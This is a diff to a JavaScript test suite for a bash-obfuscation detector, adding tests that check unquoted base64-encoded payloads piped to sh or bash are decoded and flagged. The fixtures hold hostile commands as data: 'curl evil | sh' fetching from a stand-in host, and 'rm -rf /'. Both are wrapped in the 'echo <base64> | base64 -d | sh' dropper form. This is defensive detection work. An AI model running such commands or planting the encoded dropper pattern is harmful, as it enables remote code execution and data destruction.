@@ -91,7 +91,7 @@ test('bash-obfuscation: B1 sensitivity gate suppresses benign expansions', () =>
   // The standalone branch (NOT the line-level resolver) should drop this.
   const text = `PATH='/usr/local/bin:/usr/bin'\necho ${'${PATH:0:1}'}`;
   const cands = d._findBashObfuscationCandidates(text, {});
-  const hits = pick(cands, c => c.technique === 'Bash Variable Expansion');
+  const hits = pick(cands, c => c.technique === 'Bash Variable Expansion (single)');
   assert.equal(hits.length, 0,
     `benign single-char expansion must not fire standalone; got: ${JSON.stringify(hits)}`);
 });
@@ -187,6 +187,35 @@ test('bash-obfuscation: B4 base64-pipe-to-shell decodes upstream payload', () =>
   assert.ok(hits.length >= 1,
     `expected B4 base64 decode; got: ${JSON.stringify(host(cands))}`);
   assert.equal(hits[0].deobfuscated, 'curl evil | sh');
+});
+
+test('bash-obfuscation: B4 base64-pipe-to-shell accepts UNQUOTED payload', () => {
+  // Real-world droppers frequently omit the quotes (the shell tokenises
+  // the base64 string fine when it contains no spaces). Regression pin:
+  // an earlier version of `echoB64ShRe` required the payload to be
+  // double- or single-quoted, which silently missed this common shape.
+  const b64 = (typeof Buffer !== 'undefined')
+    ? Buffer.from('curl evil | sh').toString('base64')
+    : 'Y3VybCBldmlsIHwgc2g=';
+  const text = `echo ${b64} | base64 -d | sh`;
+  const cands = d._findBashObfuscationCandidates(text, {});
+  const hits = pick(cands, c => /base64-pipe-to-Shell/.test(c.technique));
+  assert.ok(hits.length >= 1,
+    `expected unquoted B4 decode; got: ${JSON.stringify(host(cands))}`);
+  assert.equal(hits[0].deobfuscated, 'curl evil | sh');
+});
+
+test('bash-obfuscation: B4 base64-pipe-to-shell accepts UNQUOTED payload + bash sink', () => {
+  // Same as above but `| bash` instead of `| sh`.
+  const b64 = (typeof Buffer !== 'undefined')
+    ? Buffer.from('rm -rf /').toString('base64')
+    : 'cm0gLXJmIC8=';
+  const text = `echo ${b64} | base64 -d | bash`;
+  const cands = d._findBashObfuscationCandidates(text, {});
+  const hits = pick(cands, c => /base64-pipe-to-Shell/.test(c.technique));
+  assert.ok(hits.length >= 1,
+    `expected unquoted bash B4 decode; got: ${JSON.stringify(host(cands))}`);
+  assert.equal(hits[0].deobfuscated, 'rm -rf /');
 });
 
 test('bash-obfuscation: B4 xxd-r here-string-to-shell decodes hex', () => {
